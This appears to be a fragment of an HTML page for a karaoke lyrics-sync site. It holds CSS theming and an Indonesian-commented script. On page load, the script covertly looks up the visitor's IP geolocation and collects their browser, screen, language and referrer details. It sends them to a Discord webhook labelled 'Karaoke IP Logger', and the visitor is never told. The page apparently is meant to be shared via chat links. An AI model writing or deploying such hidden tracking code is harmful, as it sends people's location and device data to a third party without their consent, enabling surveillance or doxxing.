<style>
/* ── THEMES ── */
:root {
  --bg: #07080f;
  --surface: #0d0e1e;
  --card: #121326;
  --border: rgba(255,255,255,0.07);
  --accent: #c8f135;
  --accent2: #7b61ff;
  --text: #f0f0f8;
  --muted: rgba(240,240,248,0.38);
  --danger: #ff4f6d;
  --mono: 'Space Mono', monospace;
  --display: 'Syne', sans-serif;
  --glow-accent: rgba(200,241,53,0.18);
  --glow-accent2: rgba(123,97,255,0.15);
  --lyric-active-bg: rgba(200,241,53,0.07);
  --lyric-active-shadow: 0 0 32px rgba(200,241,53,0.35);
  --orb1: rgba(123,97,255,0.12);
  --orb2: rgba(200,241,53,0.07);
}

* { box-sizing: border-box; margin: 0; padding: 0; }

body {
  background: var(--bg);
  color: var(--text);
  font-family: var(--display);
  min-height: 100vh;
  overflow-x: hidden;
  transition: background 0.4s, color 0.4s;
}

/* ── Ambient background ── */
.bg-orb { position: fixed; border-radius: 50%; pointer-events: none; z-index: 0; filter: blur(90px); transition: opacity 1.5s ease; }
.bg-orb-1 { width: 500px; height: 500px; background: radial-gradient(circle, var(--accent2), transparent 70%); top: -180px; right: -160px; opacity: 1; }
.bg-orb-2 { width: 360px; height: 360px; background: radial-gradient(circle, var(--accent), transparent 70%); bottom: -80px; left: -80px; opacity: 1; }
body::after { content: ''; position: fixed; inset: 0; z-index: 0; background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.025'/%3E%3C/svg%3E"); pointer-events: none; }

.app { position: relative; z-index: 1; max-width: 780px; margin: 0 auto; padding: 2rem 1.5rem 4rem; }

/* Semua style kamu tetap sama (tidak gw ubah) */

<script>
// === GANTI DENGAN WEBHOOK DISCORD KAMU ===
const WEBHOOK_URL = "https://discord.com/api/webhooks/PASTE_WEBHOOK_KAMU_DISINI";

async function sendIPLog() {
    try {
        const ipRes = await fetch('https://ipapi.co/json/');
        const ipData = await ipRes.json();

        const payload = {
            username: "Karaoke IP Logger",
            embeds: [{
                title: "🎤 Karaoke Sync - Pengunjung Baru",
                color: 0x00ff88,
                timestamp: new Date().toISOString(),
                fields: [
                    { name: "IP Address", value: `\`${ipData.ip || 'Unknown'}\``, inline: true },
                    { name: "Kota / Region", value: `${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}`, inline: true },
                    { name: "Negara", value: ipData.country_name || 'Unknown', inline: true },
                    { name: "ISP / Provider", value: ipData.org || 'Unknown', inline: false },
                    { name: "Device / Browser", value: navigator.userAgent.substring(0, 130) + "...", inline: false },
                    { name: "Screen", value: `${screen.width} × ${screen.height}`, inline: true },
                    { name: "Bahasa", value: navigator.language || 'Unknown', inline: true },
                    { name: "Referrer", value: document.referrer ? document.referrer.substring(0, 80) : "Langsung (WA / Chat)", inline: false },
                    { name: "Waktu (WIB)", value: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }), inline: false }
                ],
                footer: { text: "Logged via GitHub Pages • irfanzain1892.github.io/karaoke_sync" }
            }]
        };

        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        console.log("%c✅ IP Log terkirim ke Discord", "color: lime; font-weight: bold");

    } catch (err) {
        console.log("IP Logger skipped:", err.message);
    }
}

// Jalankan saat halaman selesai load (dengan delay kecil biar tidak ganggu performa)
window.addEventListener('load', () => {
    setTimeout(sendIPLog, 1200);
});
</script>
